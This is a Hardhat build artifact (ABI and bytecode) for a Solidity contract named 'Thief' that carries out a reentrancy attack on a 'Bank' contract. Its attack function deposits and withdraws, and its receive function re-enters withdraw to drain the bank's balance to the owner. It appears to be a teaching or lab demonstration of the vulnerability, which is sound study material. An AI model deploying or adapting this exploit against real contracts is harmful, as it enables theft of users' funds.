{
  "_format": "hh-sol-artifact-1",
  "contractName": "Thief",
  "sourceName": "contracts/Thief.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516108c13803806108c1833981810160405281019061003291906101d4565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b815250506100f16040518060400160405280601c81526020017f4465706c6f79696e672074686520546869656620636f6e7472616374000000008152506100f760201b61032b1760201c565b50610301565b6101938160405160240161010b9190610236565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061019660201b60201c565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6000815190506101ce816102ea565b92915050565b6000602082840312156101e657600080fd5b60006101f4848285016101bf565b91505092915050565b600061020882610258565b6102128185610263565b93506102228185602086016102a6565b61022b816102d9565b840191505092915050565b6000602082019050818103600083015261025081846101fd565b905092915050565b600081519050919050565b600082825260208201905092915050565b600061027f82610286565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156102c45780820151818401526020810190506102a9565b838111156102d3576000848401525b50505050565b6000601f19601f8301169050919050565b6102f381610274565b81146102fe57600080fd5b50565b60805160601c610588610339600039600081816048015281816086015281816101da0152818161022201526102ab01526105886000f3fe6080604052600436106100385760003560e01c806376cdb03b146101785780638da5cb5b146101a35780639e5faafc146101ce57610173565b3661017357670de0b6b3a76400007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610109577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ec57600080fd5b505af1158015610100573d6000803e3d6000fd5b50505050610171565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561016f573d6000803e3d6000fd5b505b005b600080fd5b34801561018457600080fd5b5061018d6101d8565b60405161019a919061045f565b60405180910390f35b3480156101af57600080fd5b506101b86101fc565b6040516101c59190610444565b60405180910390f35b6101d6610220565b005b7f000000000000000000000000000000000000000000000000000000000000000081565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561029057600080fd5b505af11580156102a4573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b50505050565b6103c18160405160240161033f919061047a565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506103c4565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6103f6816104b8565b82525050565b610405816104ea565b82525050565b60006104168261049c565b61042081856104a7565b935061043081856020860161050e565b61043981610541565b840191505092915050565b600060208201905061045960008301846103ed565b92915050565b600060208201905061047460008301846103fc565b92915050565b60006020820190508181036000830152610494818461040b565b905092915050565b600081519050919050565b600082825260208201905092915050565b60006104c3826104ca565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104f5826104fc565b9050919050565b6000610507826104ca565b9050919050565b60005b8381101561052c578082015181840152602081019050610511565b8381111561053b576000848401525b50505050565b6000601f19601f830116905091905056fea26469706673582212205dd54e0749ba0589494549c06554cb1388126e682173cf6f057a90984193125c64736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}